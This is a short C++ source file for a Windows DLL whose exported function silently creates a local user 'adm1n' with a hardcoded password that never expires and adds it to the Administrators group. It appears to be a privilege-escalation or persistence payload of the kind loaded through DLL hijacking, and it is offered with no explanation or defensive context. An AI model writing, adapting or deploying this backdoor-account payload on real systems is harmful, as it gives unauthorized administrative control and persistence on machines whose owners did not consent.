#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

extern "C" __declspec(dllexport) void EntryPoint()
{
    USER_INFO_1 user = {0};
    user.usri1_name = (LPWSTR)L"adm1n";
    user.usri1_password = (LPWSTR)L"P@ssw0rd";
    user.usri1_priv = USER_PRIV_USER;
    user.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;

    NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);

    LOCALGROUP_MEMBERS_INFO_3 adminInfo = {0};
    adminInfo.lgrmi3_domainandname = (LPWSTR)L"adm1n";
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&adminInfo, 1);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    return TRUE;
}
